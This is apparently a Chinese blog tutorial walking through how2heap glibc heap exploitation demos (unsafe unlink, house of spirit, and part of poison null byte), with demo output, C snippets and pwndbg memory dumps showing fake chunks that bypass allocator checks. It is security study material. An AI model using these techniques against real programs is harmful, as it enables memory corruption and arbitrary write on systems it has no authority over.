---
title: how2heap - 2
date: 2019-07-08 22:36:34
tags: pwn
---

# how2heap-2

<!--more-->

## 源码调试

安装 glibc 符号表：

``` bash
sudo apt-get install libc6-dbg
```

安装 glibc 源文件：

``` bash
sudo apt-get source libc6-dev
```

进入 gdb 后加载源文件，由于 gdb 不支持递归查询，因此需要给出完整路径，比如我这里就是：

```
directory glibc-2.23/malloc/
```


## unsafe_unlink

Exploiting free on a corrupted chunk to get arbitrary write.

利用 free 改写全局指针 chunk0_ptr 达到任意内存写的目的，即 unsafe unlink。

### 输出

```
$ ./glibc_2.25/unsafe_unlink 
Welcome to unsafe unlink 2.0!
Tested in Ubuntu 14.04/16.04 64bit.
This technique can be used when you have a pointer at a known location to a region you can call unlink on.
The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.
The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.

The global chunk0_ptr is at 0x602070, pointing to 0x603010
The victim chunk we are going to corrupt is at 0x6030a0

We create a fake chunk inside chunk0.
We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.
We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.
With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False
Fake chunk fd: 0x602058
Fake chunk bk: 0x602060

We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.
We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.
It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly
If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80
We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.

Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.
You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344

At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.
chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.
Original value: Hello!~
New Value: BBBBAAAA
```

### 解释

首先创建两个 chunk，chunk_0、chunk_1。

```
pwndbg> heap
0x603000 PREV_INUSE {
  prev_size = 0, 
  size = 145, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603090 PREV_INUSE {
  prev_size = 0, 
  size = 145, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603120 PREV_INUSE {
  prev_size = 0, 
  size = 134881, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

```
pwndbg> x/40gx 0x603000-0x10
0x602ff0:	0x0000000000000000	0x0000000000000000
0x603000:	0x0000000000000000	0x0000000000000091      <-- chunk 0
0x603010:	0x0000000000000000	0x0000000000000000
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000091      <-- chunk 1
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000000
0x6030c0:	0x0000000000000000	0x0000000000000000
0x6030d0:	0x0000000000000000	0x0000000000000000
0x6030e0:	0x0000000000000000	0x0000000000000000
0x6030f0:	0x0000000000000000	0x0000000000000000
0x603100:	0x0000000000000000	0x0000000000000000
0x603110:	0x0000000000000000	0x0000000000000000
0x603120:	0x0000000000000000	0x0000000000020ee1
```
> 紧接着我们假设这个时候我们有堆溢出，可以对chunk 0 进行修改，我们伪造个chunk。

由于在 malloc 中有这样的检查：

``` c
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      \
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
```

我们可以利用全局指针 `chunk0_ptr` 构造 fake chunk 绕过。

伪造 fake chunk 的 fd 为：`chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);`

伪造 fake chunk 的 bk 为：`chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);`

这时再看看内存中的数据：

```
pwndbg> x/40gx 0x603000-0x10
0x602ff0:	0x0000000000000000	0x0000000000000000
0x603000:	0x0000000000000000	0x0000000000000091      <-- chunk 0
0x603010:	0x0000000000000000	0x0000000000000000      <-- fake chunk
0x603020:	0x0000000000602058	0x0000000000602060          fake fd, bk
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000091      <-- chunk 1 <-- prev_size
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000000
0x6030c0:	0x0000000000000000	0x0000000000000000
0x6030d0:	0x0000000000000000	0x0000000000000000
0x6030e0:	0x0000000000000000	0x0000000000000000
0x6030f0:	0x0000000000000000	0x0000000000000000
0x603100:	0x0000000000000000	0x0000000000000000
0x603110:	0x0000000000000000	0x0000000000000000
0x603120:	0x0000000000000000	0x0000000000020ee1
```

```
pwndbg> x/5gx 0x0000000000602058
0x602058:	0x0000000000000000	0x00007ffff7dd2540          <-- fake chunk FD
0x602068 <completed.7594>:	0x0000000000000000	0x0000000000603010  <-- bk pointer
0x602078:	0x0000000000000000
pwndbg> x/5gx 0x0000000000602060
0x602060 <stderr@@GLIBC_2.2.5>:	0x00007ffff7dd2540	0x0000000000000000  <-- fake chunk BK
0x602070 <chunk0_ptr>:	0x0000000000603010	0x0000000000000000      <-- fd pointer
0x602080:	0x0000000000000000
```

这样就会变成我构造的 fake chunk(0x603010) 的 FD 块(0x602058) 的 bk(0x603010) 指向 fake chunk，fake chunk 的 BK 块(0x602060) 的 fd(0x603010) 指向 fake chunk，这样就能绕过检查。

-----

libc 使用 size 域的最低 3 位来 存储一些其它信息。相关的掩码信息定义如下:

``` c
#define PREV_INUSE 0x1
#define IS_MMAPPED 0x2 
#define NON_MAIN_ARENA 0x4
```

> 从以上代码定义可以推断
> 1. size域的最低位表示此块的上一块（表示连续内存中的上一块）是否在使用状态，如果此位为 0 则表示上一块为被释放的块，这个时候此块的 `PREV_SIZE` 域保存的是上一块的地址以便在 free 此块时能够找到上一块的地址并进行合并操作。
> 2. 第 2 位表示此块是否由 mmap 分配, 如果此位为 0 则此块是由 top chunk 分裂得来，否则是由 mmap 单独分配而来。
> 3. 第 3 位表示此块是否不属于 main_arena。

-----

这时代码执行流将 chunk1 的 `prev_size` 修改为 fake chunk 的大小（0x80），将 `PREV_INUSE` 标志位改为 0，这样就可以将 fake chunk 伪造成一个 free chunk：

```
pwndbg> x/40gx 0x603000-0x10
0x602ff0:	0x0000000000000000	0x0000000000000000
0x603000:	0x0000000000000000	0x0000000000000091      <-- chunk0
0x603010:	0x0000000000000000	0x0000000000000000
0x603020:	0x0000000000602058	0x0000000000602060
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000080	0x0000000000000090      <-- chunk1
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000000
0x6030c0:	0x0000000000000000	0x0000000000000000
0x6030d0:	0x0000000000000000	0x0000000000000000
0x6030e0:	0x0000000000000000	0x0000000000000000
0x6030f0:	0x0000000000000000	0x0000000000000000
0x603100:	0x0000000000000000	0x0000000000000000
0x603110:	0x0000000000000000	0x0000000000000000
0x603120:	0x0000000000000000	0x0000000000020ee1
```

此时我们 free chunk1，这个时候系统会检查到 fake chunk 是释放状态，触发 unlink，fake chunk 会向后合并，chunk0 会被吞并。

```
pwndbg> heap
0x603000 PREV_INUSE {
  prev_size = 0, 
  size = 145, 
  fd = 0x0, 
  bk = 0x20ff1, 
  fd_nextsize = 0x602058, 
  bk_nextsize = 0x602060 <stderr@@GLIBC_2.2.5>
}
0x603090 {
  prev_size = 128, 
  size = 144, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603120 PREV_INUSE {
  prev_size = 0, 
  size = 134881, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> x/20xg 0x603000
0x603000:	0x0000000000000000	0x0000000000000091
0x603010:	0x0000000000000000	0x0000000000020ff1
0x603020:	0x0000000000602058	0x0000000000602060      <-- fd, bk
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000080	0x0000000000000090
```

unlink 的操作如下：

``` c
FD = P->fd;
BK = P->bk;
FD->bk = BK;
BK->fd = FD;
```

在这里，FD 被修改为 `P->fd` 也就是 0x602058，BK 被修改为 `P->bk` 也就是 0x602060。
`FD->bk`(0x602058 -> 0x603010) 修改为 BK(0x602060)，`BK->fd` 被修改为 0x602058。

根据 fd 和 bk 指针在 malloc_chunk 结构体中的位置，这段代码等价于：

``` c
FD = P->fd = &P - 24;
BK = P->bk = &P - 16;
FD->bk = *(&P - 24 + 24) = P;
BK->fd = *(&P - 16 + 16) = P;
```

这样就通过了 unlink 的检查，最终效果为：

``` c
FD->bk = P = BK = &P - 16;
BK->fd = P = FD = &P - 24;
```

修改前 `chunk0_ptr` 的值是 0x603010。

我们跟踪一下，会发现它的值会在 unlink 的时候发生改变：

```
Hardware watchpoint 7: chunk0_ptr

Old value = (uint64_t *) 0x603010
New value = (uint64_t *) 0x602060 <stderr@@GLIBC_2.2.5>
0x00007ffff7a8cf77 in _int_free (av=0x7ffff7dd1b20 <main_arena>, p=<optimized out>, have_lock=0) at malloc.c:4005

```

```
Hardware watchpoint 7: chunk0_ptr

Old value = (uint64_t *) 0x602060 <stderr@@GLIBC_2.2.5>
New value = (uint64_t *) 0x602058
0x00007ffff7a8cf7b in _int_free (av=0x7ffff7dd1b20 <main_arena>, p=<optimized out>, have_lock=0) at malloc.c:4005

```

> 最后原本指向堆上 fake chunk 的指针 P 指向了自身地址减 24 的位置,这就意味着如果我们能对堆P进行写入，则就有了任意内存写。如果我们能对堆P进行读取，则就有了信息泄露。
> 在这个例子中，最后 chunk0_ptr 和 chunk0_ptr[3] 指向的地方是一样的。相对我们如果对 chunk0_ptr[3] 修改，也是对 chunk0_ptr 进行了修改。
> 在程序中，程序先对 `chunk0_ptr[3]` 进行了修改，让它指向了 `victim_string` 字符串的指针。

``` c
    strcpy(victim_string,"Hello!~");
    chunk0_ptr[3] = (uint64_t) victim_string;
```

> （如果这个地址是 got 表地址，我们紧接着就可以 进行 劫持 got 的操作。）

```
pwndbg> x/40gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000091
0x603010:	0x0000000000000000	0x0000000000020ff1
0x603020:	0x0000000000602058	0x0000000000602060
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000080	0x0000000000000090
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000000
0x6030c0:	0x0000000000000000	0x0000000000000000
0x6030d0:	0x0000000000000000	0x0000000000000000
0x6030e0:	0x0000000000000000	0x0000000000000000
0x6030f0:	0x0000000000000000	0x0000000000000000
0x603100:	0x0000000000000000	0x0000000000000000
0x603110:	0x0000000000000000	0x0000000000000000
0x603120:	0x0000000000000000	0x0000000000020ee1
0x603130:	0x0000000000000000	0x0000000000000000
pwndbg> p &chunk0_ptr 
$17 = (uint64_t **) 0x602070 <chunk0_ptr>
pwndbg> p chunk0_ptr 
$3 = (uint64_t *) 0x7fffffffdc90
pwndbg> x/20xg 0x00007fffffffdc90
0x7fffffffdc90:	0x007e216f6c6c6548	0x426725b043d32a00
0x7fffffffdca0:	0x0000000000400ab0	0x00007ffff7a2d830
0x7fffffffdcb0:	0x0000000000000001	0x00007fffffffdd88
0x7fffffffdcc0:	0x00000001f7ffcca0	0x00000000004006a6
0x7fffffffdcd0:	0x0000000000000000	0x862bbb4b5093d54f
0x7fffffffdce0:	0x00000000004005b0	0x00007fffffffdd80
0x7fffffffdcf0:	0x0000000000000000	0x0000000000000000
0x7fffffffdd00:	0x79d44434fc93d54f	0x79d4548eea23d54f
0x7fffffffdd10:	0x0000000000000000	0x0000000000000000
0x7fffffffdd20:	0x0000000000000000	0x00007fffffffdd98
```

然后对 chunk0_ptr 进行操作，就能得到一个地址写：

```
pwndbg> x/20xg chunk0_ptr 
0x7fffffffdc90:	0x4141414142424242	0x426725b043d32a00
0x7fffffffdca0:	0x0000000000400ab0	0x00007ffff7a2d830
0x7fffffffdcb0:	0x0000000000000001	0x00007fffffffdd88
0x7fffffffdcc0:	0x00000001f7ffcca0	0x00000000004006a6
0x7fffffffdcd0:	0x0000000000000000	0x862bbb4b5093d54f
0x7fffffffdce0:	0x00000000004005b0	0x00007fffffffdd80
0x7fffffffdcf0:	0x0000000000000000	0x0000000000000000
0x7fffffffdd00:	0x79d44434fc93d54f	0x79d4548eea23d54f
0x7fffffffdd10:	0x0000000000000000	0x0000000000000000
0x7fffffffdd20:	0x0000000000000000	0x00007fffffffdd98
```

总结下，如果我们找到一个全局指针，通过unlink的手段，我们就构造一个chunk指向这个指针所指向的位置，然后通过对chunk的操作来进行读写操作。

## house_of_spirit

Frees a fake fastbin chunk to get malloc to return a nearly-arbitrary pointer.

> 通过构造 fake chunk，然后将其 free 掉，就可以在下一次 malloc 时返回 fake chunk 的地址。

> house of spirit 通常用来配合栈溢出使用,通常场景是，栈溢出无法覆盖到的 EIP ，而恰好栈中有一个即将被 free 的堆指针。我们通过在栈上 fake 一个 fastbin chunk 接着在 free 操作时，这个栈上的堆块被放到 fast bin 中，下一次 malloc 对应的大小时，由于 fast bin 的先进后出机制，这个栈上的堆块被返回给用户，再次写入时就可能造成返回地址的改写。所以利用的第一步不是去控制一个 chunk，而是控制传给 free 函数的指针，将其指向一个 fake chunk。所以 fake chunk 的伪造是关键。

### 输出

```
$ ./glibc_2.25/house_of_spirit 
This file demonstrates the house of spirit attack.
Calling malloc() once so that it sets up its memory.
We will now overwrite a pointer to point to a fake 'fastbin' region.
This region (memory of length: 80) contains two chunks. The first starts at 0x7fffffffdc98 and the second at 0x7fffffffdcd8.
This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. 
The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.
Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7fffffffdc98.
... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
Freeing the overwritten pointer.
Now the next malloc will return the region of our fake chunk at 0x7fffffffdc98, which will be 0x7fffffffdca0!
malloc(0x30): 0x7fffffffdca0
```

这个文件演示了 house of spirit 这种攻击方式。

首先 malloc(1) 初始化内存布局，然后修改一个指针以指向 fake fastbin 区域。

接下来的操作：

``` c
unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));
```

这一块区域长度为 80，包含两个 chunk，第一块的起始地址是 0x7fffffffdc98(`fake_chunks[0]`)，第二块的起始地址是 0x7fffffffdcd8(`fake_chunks[9]`)。

第一个 chunk 的 size 必须要小于 128(x64)，而且还必须比正常的多 16 个（以容纳块中的数据）。对于 fastbin，`PREV_INUSE(lsb)` 位会被忽略，但是 `IS_MAPPED` 和 `NON_MAIN_ARENA` 仍然会被考虑。

还要注意的一点是这个 size 必须是下一个 malloc 请求的大小，而且 malloc 会对申请的 size 进行对齐：比如在 x64 的及其上申请的 0x30~0x38 大小的内存会被对齐为 0x40。

接下来设置 `fake_chunk1`：

``` c
fake_chunks[1] = 0x40; // this is the size 这是 fake chunk1 的 size (64)
```

第二块 fake chunk 的大小也有要求：大于 `2*SIZE_SZ`(x64 中是大于 16 字节)，小于 `av->system_mem`(main arena 的默认值是 128kb) 以通过 `nextsize integrity checks`，对 fastbin 的大小没有要求。

``` c
    // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
    fake_chunks[9] = 0x1234; // nextsize
```

这里设置 `fake_chunks[9] = 0x1234` 因为第一个 chunk 的大小是 64，除 `sizeof(unsigned long long)` 值为 8。

此时 fake chunks 的值如下：

```
pwndbg> p/x fake_chunks 
$2 = {0x1, 0x40, 0x7ffff7ffe168, 0xf0b6ff, 0x1, 0x4008ed, 0x7fffffffdc9e, 0x0, 0x4008a0, 0x1234}
pwndbg> p &fake_chunks 
$3 = (unsigned long long (*)[10]) 0x7fffffffdc40
```

接下来用 fake chunk1 的地址覆盖指针，而且还要**注意** fake chunk 的地址必须是 16 字节对齐的。

修改前：

```
pwndbg> p a
$4 = (unsigned long long *) 0x7fffffffdd98
```

``` c
a = &fake_chunks[2];
```

修改后：

```
$5 = (unsigned long long *) 0x7fffffffdc50
```

此时 a 已经指向了 fake chunk。

```
pwndbg> x/4xg &fake_chunks 
0x7fffffffdc40:	0x0000000000000001	0x0000000000000040
0x7fffffffdc50:	0x00007ffff7ffe168	0x0000000000f0b6ff
```

当我们 free a 的时候，系统会将 fake chunk 当作一块 fastbin 处理，把它放入 fastbins 数组中。当我们再次 malloc 的时候，我们就会得到一块指向 stack 的 chunk。

```
free(a);
```

之后的 fastbins 列表：

```
pwndbg> fastbins 
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x7fffffffdc40 ◂— 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

接下来我们申请一块内存，就可以将栈上的地址分配出去了：

```
pwndbg> x/10xg &fake_chunks 
0x7fffffffdc40:	0x0000000000000001	0x0000000000000040
0x7fffffffdc50:	0x0000000000000000	0x0000000000f0b6ff
0x7fffffffdc60:	0x0000000000000001	0x00000000004008ed
0x7fffffffdc70:	0x00007fffffffdc9e	0x0000000000000000
0x7fffffffdc80:	0x00000000004008a0	0x0000000000001234
```

> 所以 house-of-spirit 的主要目的是，当我们伪造的 fake chunk 内部存在不可控区域时，运用这一技术可以将这片区域变成可控的。上面为了方便观察，在 fake chunk 里填充一些字母，但在现实中这些位置很可能是不可控的，而 house-of-spirit 也正是以此为目的而出现的。
> 该技术的缺点也是需要对栈地址进行泄漏，否则无法正确覆盖需要释放的堆指针，且在构造数据时，需要满足对齐的要求等。

## poison_null_byte

Exploiting a single null byte overflow.

off-by-one，零字节溢出。

### 输出

```
$ ./glibc_2.25/poison_null_byte 
Welcome to poison null byte 2.0!
Tested in Ubuntu 14.04 64bit.
This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.
This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.
We allocate 0x100 bytes for 'a'.
a: 0x603010
Since we want to overflow 'a', we need to know the 'real' size of 'a' (it may be more than 0x100 because of rounding): 0x108
b: 0x603120
c: 0x603330
We allocate a barrier at 0x603440, so that c is not consolidated with the top-chunk when freed.
The barrier is not strictly necessary, but makes things less confusing
In newer versions of glibc we will need to have our updated size inside b itself to pass the check 'chunksize(P) != prev_size (next_chunk(P))'
b.size: 0x211
b.size is: (0x200 + 0x10) | prev_in_use
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x200
c.prev_size is 0x210
We will pass the check since chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))
b1: 0x603120
Now we malloc 'b1'. It will be placed where 'b' was. At this point c.prev_size should have been updated, but it was not: 0x210
Interestingly, the updated value of c.prev_size has been written 0x10 bytes before c.prev_size: f0
We malloc 'b2', our 'victim' chunk.
b2: 0x603230
Current b2 content:
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').
Finally, we allocate 'd', overlapping 'b2'.
d: 0x603120
Now 'd' and 'b2' overlap.
New b2 content:
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunksfor the clear explanation of this technique.
```

``` c
	fprintf(stderr, "We allocate 0x100 bytes for 'a'.\n");
	a = (uint8_t*) malloc(0x100);
	fprintf(stderr, "a: %p\n", a);
	int real_a_size = malloc_usable_size(a);
	fprintf(stderr, "Since we want to overflow 'a', we need to know the 'real' size of 'a' "
		"(it may be more than 0x100 because of rounding): %#x\n", real_a_size);

	/* chunk size attribute cannot have a least significant byte with a value of 0x00.
	 * the least significant byte of this will be 0x10, because the size of the chunk includes
	 * the amount requested plus some amount required for the metadata. */
	b = (uint8_t*) malloc(0x200);

	fprintf(stderr, "b: %p\n", b);

	c = (uint8_t*) malloc(0x100);
	fprintf(stderr, "c: %p\n", c);

	barrier =  malloc(0x100);
	fprintf(stderr, "We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"
		"The barrier is not strictly necessary, but makes things less confusing\n", barrier);
```

首先给 a 分配 0x100 个字节。由于空间复用的存在，我们需要知道 a 的实际大小(0x108)。

接下来分配 0x200 个字节给 b，再分配 0x100 个字节给 c，接着分配 0x100 个字节给 barrier。

barrier 的作用是防止在释放 c 的时候 c 被放入 top chunk。而且 b,c 的大小不能为 fastbins chunk size，因为 fastbins chunk 在被释放后不会合并。chunk a 的作用是构造单字节溢出。

此时的 heap 与 c - 0x20：

```
0x603000 PREV_INUSE {
  prev_size = 0, 
  size = 273, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603110 PREV_INUSE {
  prev_size = 0, 
  size = 529, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603320 PREV_INUSE {
  prev_size = 0, 
  size = 273, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603430 PREV_INUSE {
  prev_size = 0, 
  size = 273, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603540 PREV_INUSE {
  prev_size = 0, 
  size = 133825, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> p b
$4 = (uint8_t *) 0x603120 ""
pwndbg> x/20xg c-0x20
0x603310:	0x0000000000000000	0x0000000000000000
0x603320:	0x0000000000000000	0x0000000000000111
0x603330:	0x0000000000000000	0x0000000000000000
0x603340:	0x0000000000000000	0x0000000000000000
0x603350:	0x0000000000000000	0x0000000000000000
0x603360:	0x0000000000000000	0x0000000000000000
0x603370:	0x0000000000000000	0x0000000000000000
0x603380:	0x0000000000000000	0x0000000000000000
0x603390:	0x0000000000000000	0x0000000000000000
0x6033a0:	0x0000000000000000	0x0000000000000000
pwndbg> p b + 0x1f0
$5 = (uint8_t *) 0x603310 ""
```

``` c++
	uint64_t* b_size_ptr = (uint64_t*)(b - 8);

	// added fix for size==prev_size(next_chunk) check in newer versions of glibc
	// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
	// this added check requires we are allowed to have null pointers in b (not just a c string)
	//*(size_t*)(b+0x1f0) = 0x200;
	fprintf(stderr, "In newer versions of glibc we will need to have our updated size inside b itself to pass "
		"the check 'chunksize(P) != prev_size (next_chunk(P))'\n");
	// we set this location to 0x200 since 0x200 == (0x211 & 0xff00)
	// which is the value of b.size after its first byte has been overwritten with a NULL byte
	*(size_t*)(b+0x1f0) = 0x200;
```

由于在进行一字节溢出之前，我们通过 chunk a 的单字节溢出修改了 chunk b 的 size，为了绕过 unlink 的check：

``` c
chunksize(P) != prev_size (next_chunk(P))
```

在新版的 glibc 中我们还需要伪造一个 c prev_size，计算方法为 `c.prev_size = b_size & 0xff00`，也就是 `0x200 = 0x211 & 0xff00`。

此时的 c - 0x20：

```
pwndbg> x/20xg c-0x20
0x603310:	0x0000000000000200	0x0000000000000000
0x603320:	0x0000000000000000	0x0000000000000111
0x603330:	0x0000000000000000	0x0000000000000000
0x603340:	0x0000000000000000	0x0000000000000000
0x603350:	0x0000000000000000	0x0000000000000000
0x603360:	0x0000000000000000	0x0000000000000000
0x603370:	0x0000000000000000	0x0000000000000000
0x603380:	0x0000000000000000	0x0000000000000000
0x603390:	0x0000000000000000	0x0000000000000000
0x6033a0:	0x0000000000000000	0x0000000000000000
```

``` c++
	// this technique works by overwriting the size metadata of a free chunk
	free(b);
	
	fprintf(stderr, "b.size: %#lx\n", *b_size_ptr);
	fprintf(stderr, "b.size is: (0x200 + 0x10) | prev_in_use\n");
```

接下来释放 b。

此时 chunk 布局如下：

```
pwndbg> x/124gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000111      <-- chunk a
0x603010:	0x0000000000000000	0x0000000000000000
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000000
0x6030c0:	0x0000000000000000	0x0000000000000000
0x6030d0:	0x0000000000000000	0x0000000000000000
0x6030e0:	0x0000000000000000	0x0000000000000000
0x6030f0:	0x0000000000000000	0x0000000000000000
0x603100:	0x0000000000000000	0x0000000000000000
0x603110:	0x0000000000000000	0x0000000000000211      <-- chunk b [was free]
0x603120:	0x00007ffff7dd1b78	0x00007ffff7dd1b78      fd, bk
0x603130:	0x0000000000000000	0x0000000000000000
0x603140:	0x0000000000000000	0x0000000000000000
....
....
....
0x603300:	0x0000000000000000	0x0000000000000000
0x603310:	0x0000000000000200	0x0000000000000000      fake c prev_size
0x603320:	0x0000000000000210	0x0000000000000110      <-- chunk c
0x603330:	0x0000000000000000	0x0000000000000000
0x603340:	0x0000000000000000	0x0000000000000000
0x603350:	0x0000000000000000	0x0000000000000000
0x603360:	0x0000000000000000	0x0000000000000000
0x603370:	0x0000000000000000	0x0000000000000000
0x603380:	0x0000000000000000	0x0000000000000000
0x603390:	0x0000000000000000	0x0000000000000000
0x6033a0:	0x0000000000000000	0x0000000000000000
0x6033b0:	0x0000000000000000	0x0000000000000000
0x6033c0:	0x0000000000000000	0x0000000000000000
0x6033d0:	0x0000000000000000	0x0000000000000000
```

此时的 free list：

```
pwndbg> unsortedbin 
unsortedbin
all: 0x603110 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603110
```

接下来通过 one-byte-off 修改 chunk b 的 size：

``` c++
	fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'\n");
	a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"
	fprintf(stderr, "b.size: %#lx\n", *b_size_ptr);

	uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
	fprintf(stderr, "c.prev_size is %#lx\n",*c_prev_size_ptr);
```

此时内存中的值：

```
pwndbg> x/124gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000111      <-- chunk a
0x603010:	0x0000000000000000	0x0000000000000000
0x603020:	0x0000000000000000	0x0000000000000000
